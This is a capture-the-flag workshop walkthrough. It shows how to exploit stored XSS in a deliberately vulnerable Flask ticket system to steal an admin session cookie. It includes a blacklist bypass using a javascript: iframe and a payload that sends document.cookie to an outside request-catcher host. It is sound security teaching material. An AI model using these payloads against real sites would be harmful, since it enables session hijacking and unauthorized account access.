# cookie-stealer | Web Exploitation | UtahSec 2026-01-28

Author: Carson He (zakstamaj)

CTF technical skills workshop on XSS to steal an admin session cookie and gain unauthorized access to an admin panel.

Challenge website: 

## Initial analysis

Take a bit of time to explore the website and the code inside the [app](app) folder. Don't worry if you don't understand the code; this guide will explain the important bits of the code.

The web application is written in Python using the Flask web framework.

### Login

Notice that there is a login page. However, looking through [main.py](app/main.py), there are `/login` and `/logout` routes, but no route for registering a new account. In [init_db.py](app/init_db.py), we see that there is an admin account with a random password generated in [init.sh](app/init.sh), but the password is not visible to us.

### Admin panel and session cookie

In [main.py](app/main.py), we see that there is a route for `/admin` contains the flag.

```py
@app.get("/admin")
def admin():
    if session.get("user") != "admin":
        abort(401)
    return render_template("admin.html", flag=flag)
```

The corresponding `admin.html` template at [templates/admin.html](app/templates/admin.html) shows that the flag is indeed displayed.

```
<p>flag: <code>{{flag}}</code></p>
```

Notice that the `/admin` route checks whether the client is an admin using the Flask session. Also note that Flask sessions are implemented with cookies (<https://flask.palletsprojects.com/en/stable/quickstart/#sessions>).

> [!IMPORTANT]
> This suggests that if we can steal a valid admin session cookie, then we can access the admin panel and get the flag.

> [!NOTE]
> Flask session cookies contain Base64 encoded JSON data for the claims. Why can't we just make our own session cookie with `{"user":"admin"}`?
>
> Flask session cookies are cryptographically signed with the Flask application's secret key. You can see that the Flask secret key is set in [main.py](app/main.py):
>
> ```
> app.secret_key = os.environ["FLASK_SECRET_KEY"]
> ```
>
> This means that any cookie that we forge will be considered invalid by the Flask application, because we cannot generate a valid signature, because we don't know the correct secret key. We also don't have access to the secret key, since it is randomly generated in [init.sh](app/init.sh).

### Ticket system

The website also has a support ticket system. The `POST /tickets` endpoint in [main.py](app/main.py) saves a ticket to the application database, after filtering the input through a XSS tag blacklist.

The server also has a separate program, [read_tickets.py](app/read_tickets.py), that simulates an admin reading tickets in a web browser.

Every 5 seconds, the ticket reader:

1. Logs in as admin using the correct admin password
2. Queries the web application for a list of ticket IDs
3. For each ticket:
    1. Starts a headless Chromium browser instance
    2. Sets the `session` cookie to the value from logging in
    3. Renders the ticket in a headless Chromium browser
    4. Saves a screenshot of the ticket

> [!IMPORTANT]
> The tickets are rendered in a browser that is signed in as admin. The browser also has an admin session cookie. Perhaps there is some way that we can steal this admin cookie...

## XSS vulnerability

Can you identify a XSS vulnerability in the ticket system? Look carefully at the ticket reader in [read_tickets.py](app/read_tickets.py), how it fetches tickets, and how the web application returns tickets.

<details>
<summary>Answer (click to reveal)</summary>

Looking carefully at the `/admin/tickets/<id>` route in [main.py](app/main.py), we notice that the raw text of the ticket is the entire response, and that the ticket isn't passed to a view template like the other routes using `render_template`.

```py
    if request.method == "GET":
        res = cur.execute("select text from tickets where id=?", (id,))
        row = res.fetchone()
        if not row:
            abort(404)

        ticket = row[0]
        return ticket
```

Also notice that the ticket reader in [read_tickets.py](app/read_tickets.py) uses this exact endpoint to fetch individual tickets:

```py
            driver.get(BASE_URL + f"/admin/tickets/{ticket_id}")
            driver.save_screenshot(f"tickets/{ticket_id}.png")
```

By default, the `Content-Type` header on Flask reponses will be `text/html`. This means that ticket content will be rendered as HTML by the headless browser, and any JavaScript in the HTML will be executed!
</details>

## Exploiting the XSS vulnerability

### Bypassing the XSS tag blacklist

It seems that our XSS payload might be as simple as `<script>...</script>`. However, in [main.py](app/main.py), there is a XSS tag blacklist, and tickets are not saved to the database if the ticket contains any blacklisted tags:

```py
        # Prevent any possible XSS attack, 100% foolproof
        xss_tag_blacklist = ["<script", "</script>", "<img", "</img>"]
        for tag in xss_tag_blacklist:
            if tag in ticket.lower():
                return render_template("tickets.html", error="input contains forbidden tags")
```

How can we bypass the blacklist? Feel free to search the web.

<details>
<summary>Answer (click to reveal)</summary>

One solution is to use the `iframe` element (<https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#iframe>):

```
<iframe src="javascript:...">
```
</details>

### Constructing your XSS payload

Now that we have identified a way to execute arbitrary JavaScript code in a victim's browser, we need to find how to exfiltrate the session cookie to us. JavaScript running in a browser has access to the `fetch` function, which makes an HTTP request. To access the browser cookies, we can use `document.cookie`.

We can make an HTTP request from the victim's browser, but how can we receive the request? A convenient way is to use [requestcatcher.com](https://requestcatcher.com/). Make sure to set the subdomain to something unique so that you don't get other people's traffic.

Before constructing your XSS payload for the website, it is a good idea to be able to test it locally to ensure that the payload works.

Make an HTML file named `test.html` or similar and put the following content in it:

<details>
<summary>Spoilers for the previous part (click to reveal)</summary>

```
<iframe src="javascript:alert(&quot;pwned!&quot;)">
```
</details>

Open the file with your web browser. You should see a popup window with the message "pwned!".

> [!NOTE]
> The `&quot;` parts are HTML character entities for encoding the `"` character. `&quot;pwned!&quot;` decodes to `"pwned!"`. We cannot write `"` directly because it would terminate the existing string starting at `src="`.

Now, let's build a payload that sends a request to Request Catcher. Put the following in `test.html`, and modify it to make a request to your Request Catcher subdomain. 
<details>
<summary>Spoilers for the previous section (click to reveal)</summary>

```
<iframe src="javascript:fetch(&quot;https://my-subdomain.requestcatcher.com/pwned&quot;)">
```
</details>

Open the file again with your web browser and check your Request Catcher subdomain. You should see a `GET /pwned` request in Request Catcher.

### Exfiltrating the session cookie

Adapt the payload in the previous part to exfiltrate the victim's cookies to your Request Catcher subdomain.

<details>
<summary>Answer (click to reveal)</summary>

One simple way to exfiltrate the cookies is to simply concatenate `document.cookie` to the URL.

```
<iframe src="javascript:fetch(&quot;https://my-subdomain.requestcatcher.com/&quot;+document.cookie)">
```
</details>

Check your Request Catcher. You should see an admin cookie in a few seconds!

## Logging in as admin

Open the target website in your web browser. Use your browser dev tools to set the `session` cookie to the value that you got in the last part. For example, if you got `GET /session=eyJ1c2VyIjoiYWRtaW4ifQ.aXmsVA.ceL66xSCaaKeRKw3QrBqdBtNyrs HTTP/1.1` in the exfiltration request, the value of the `session` cookie should be `eyJ1c2VyIjoiYWRtaW4ifQ.aXmsVA.ceL66xSCaaKeRKw3QrBqdBtNyrs`.

On Firefox and Chromium, you can open the dev tools with F12.

On Firefox, the cookies are in Storage -> Cookies -> website name. To add a new cookie, click the `+` button on the right.

On Chromium, the cookies are in Application -> Cookies -> website name. To add a new cookie, click right under the table header. There is an invisible first row to add a new cookie.

After setting the `session` cookie, navigate to the home page of the website. You should see that the navigation bar has changed to include an `admin` link. Click on the `admin` link. You should see the flag!

## Conclusion

I hope you had fun and learned something new! This challenge was inspired by the Hack The Box Machine challenge "Headless" (<https://www.hackthebox.com/machines/headless>).
